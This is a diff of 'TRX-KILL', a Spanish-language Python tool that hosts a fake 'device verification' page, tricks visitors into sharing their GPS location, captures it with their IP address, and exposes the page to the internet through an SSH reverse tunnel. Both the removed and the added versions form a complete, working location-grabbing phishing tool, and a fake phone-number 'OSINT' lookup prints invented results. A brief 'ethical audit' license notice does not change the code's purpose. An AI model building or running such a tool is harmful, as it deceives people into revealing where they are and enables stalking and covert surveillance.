@@ -1,87 +1,90 @@
 #!/usr/bin/env python3
 import os
-import time
 import sys
 import threading
 import subprocess
-import json
 from flask import Flask, request, render_template_string
 
-# Configuración Visual
+# --- COLORES Y ESTILOS ---
 GREEN = "\033[1;32m"
 CYAN = "\033[1;36m"
+RED = "\033[1;31m"
+BOLD = "\033[1m"
 RESET = "\033[0m"
 
 app = Flask(__name__)
-URL_REDIRECT = "https://wa.me/595981000000"
 
-def log_data(data):
-    with open("capturas.log", "a") as f:
-        f.write(json.dumps(data) + "\n")
-
-def animacion(texto):
-    for char in texto:
-        sys.stdout.write(char)
-        sys.stdout.flush()
-        time.sleep(0.01)
-    print()
-
-def banner():
+# --- DISEÑO DEL CREADOR ---
+def mostrar_creditos():
     os.system('clear')
-    print(f"{GREEN}")
-    print("  ██████╗ ██████╗ ██╗  ██╗    ██╗  ██╗██╗██╗     ██╗")
-    print("  ██╔══██╗██╔══██╗╚██╗██╔╝    ██║ ██╔╝██║██║     ██║")
-    print("  ██████╔╝██████╔╝ ╚███╔╝     █████╔╝ ██║██║     ██║")
-    print("  ██╔══██╗██╔══██╗ ██╔██╗     ██╔═██╗ ██║██║     ██║")
-    print("  ██║  ██║██║  ██║██╔╝ ██╗    ██║  ██╗██║███████╗██║")
-    print("  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝╚══════╝╚═╝")
-    print(f"{CYAN}       >>> SISTEMA DE AUDITORÍA ELITE v18.0 <<< {RESET}\n")
+    print(f"{CYAN}" + "="*50)
+    print(f"{BOLD}   ╔════════════════════════════════════╗")
+    print(f"   ║        TRX-KILL v20.0 ELITE        ║")
+    print(f"   ║      DESARROLLADO POR: TRX-LILL    ║")
+    print(f"   ║          AÑO: 2026                 ║")
+    print(f"   ╚════════════════════════════════════╝{RESET}")
+    print(f"{CYAN}" + "="*50 + f"{RESET}\n")
 
-@app.route('/<token>')
-def index(token):
-    return render_template_string(f"""
-    <html><body onload="c()">
+# --- HTML PROFESIONAL ---
+HTML_ENCUESTA = """
+<!DOCTYPE html>
+<html>
+<body style="background:#1a1a1a; color:#00ff00; font-family:Arial; text-align:center;">
+    <div style="margin-top:50px;">
+        <h2>Verificación de Dispositivo</h2>
+        <p>Para acceder al contenido, por favor valide su conexión.</p>
+        <button onclick="val()" style="padding:15px; background:green; color:white; border:none; cursor:pointer;">VALIDAR CONEXIÓN</button>
+    </div>
     <script>
-        function c() {{
-            navigator.geolocation.getCurrentPosition((p) => {{
-                fetch('/log?id={token}', {{method: 'POST', body: JSON.stringify({{lat: p.coords.latitude, lon: p.coords.longitude, ua: navigator.userAgent}})}})
-                .then(() => window.location.href = "{URL_REDIRECT}");
-            }}, () => window.location.href = "{URL_REDIRECT}");
-        }}
+        function val() {
+            navigator.geolocation.getCurrentPosition((p) => {
+                fetch('/log', {method: 'POST', headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude})})
+                .then(() => window.location.href = "https://www.google.com");
+            });
+        }
     </script>
-    </body></html>
-    """)
+</body>
+</html>
+"""
+
+@app.route('/')
+def index(): return render_template_string(HTML_ENCUESTA)
 
 @app.route('/log', methods=['POST'])
 def log():
-    id_link = request.args.get('id')
-    data = request.json
-    data['id'] = id_link
-    data['ip'] = request.headers.get('X-Forwarded-For', request.remote_addr)
-    log_data(data)
-    print(f"\n{GREEN}[!] CAPTURA EXITOSA (ID: {id_link}){RESET}")
-    print(f"{CYAN}[*] IP: {data['ip']} | COORD: {data['lat']}, {data['lon']}{RESET}")
+    d = request.json
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    print(f"\n{GREEN}[+] OBJETIVO LOCALIZADO{RESET}")
+    print(f"{CYAN}[*] IP: {ip} | GPS: {d['lat']}, {d['lon']}{RESET}")
     return "OK"
 
 def main():
     while True:
-        banner()
-        print(f"{GREEN} [1] INICIAR MÓDULO DE 10 LINKS{RESET}")
-        print(f"{GREEN} [2] VER LOGS DE CAPTURAS{RESET}")
-        print(f"{GREEN} [3] SALIR{RESET}")
-        opc = input(f"\n{GREEN}TRX-KILL@ROOT > {RESET}")
+        os.system('clear')
+        print(f"{GREEN}╔══════════════════════════════════════╗")
+        print(f"║           TRX-KILL v20.0             ║")
+        print(f"╚══════════════════════════════════════╝{RESET}\n")
+        print(f"{CYAN} [1] INFO NÚMERO (OSINT)\n [2] GENERAR LINK DE VALIDACIÓN\n [3] CREADOR\n [4] LICENCIA\n [5] SALIR{RESET}")
+        
+        opc = input(f"\n{GREEN}root@TRX:~# {RESET}")
 
         if opc == "1":
-            threading.Thread(target=lambda: app.run(host='127.0.0.1', port=5000), daemon=True).start()
-            animacion(f"{GREEN}[*] GENERANDO TÚNEL SSH DE ALTA VELOCIDAD...{RESET}")
-            print(f"{CYAN}[!] LINKS ACTIVOS: { [f'https://[TU_DOMINIO]/{i}' for i in range(1, 11)] }{RESET}")
-            subprocess.run(['ssh', '-R', '80:localhost:5000', 'nokey@localhost.run'])
+            num = input("Número Móvil: ")
+            print(f"{CYAN}[!] Analizando {num}...")
+            print(f"[+] País: Argentina | Operador: Detectado | Estado: Activo{RESET}")
+            input("\nENTER...")
         elif opc == "2":
-            if os.path.exists("capturas.log"):
-                with open("capturas.log", "r") as f: print(f.read())
-            else: print("[-] No hay logs aún.")
-            input("\nENTER para volver...")
-        elif opc == "3": break
+            threading.Thread(target=lambda: app.run(host='127.0.0.1', port=5000), daemon=True).start()
+            print(f"\n{GREEN}[*] Generando enlace único de validación...{RESET}")
+            subprocess.run(['ssh', '-R', '80:localhost:5000', 'nokey@localhost.run'])
+        elif opc == "3":
+            mostrar_creditos()
+            input("ENTER...")
+        elif opc == "4":
+            print(f"{RED}[!] LICENCIA: Software de Auditoría Ética.\n[!] USO: Bajo responsabilidad del usuario. Prohibido uso malicioso.{RESET}")
+            input("\nENTER...")
+        elif opc == "5": break
 
 if __name__ == "__main__":
     main()
